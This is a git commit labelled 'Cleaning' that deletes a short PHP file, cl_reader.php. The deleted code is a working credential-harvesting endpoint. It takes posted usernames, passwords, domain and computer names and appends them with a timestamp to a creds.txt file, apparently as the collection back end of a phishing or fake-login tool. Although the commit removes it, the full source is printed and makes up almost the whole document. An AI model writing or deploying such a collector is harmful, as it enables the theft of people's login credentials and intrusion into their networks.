8fb274448edec3f40a3a80e4a95a8f10c7930e9d
Dvir S <dviros@me.com>
2021-03-31 12:34:44 +0100

    Cleaning

--- cl_reader.php
+++
@@ -1,9 +0,0 @@
-<?php
-$file = "creds.txt";
-$date = date("h:i:s m-d-Y");
-$username = $_POST['username'];
-$password = $_POST['password'];
-$domain = $_POST['domain'];
-$computer = $_POST['computer'];
-$creds = "Date: ".$date." | Domain: ".$domain." | ComputerName: ".$computer." | Username: ".$username." | Password: ".$password."\n";
-file_put_contents($file, $creds, FILE_APPEND);
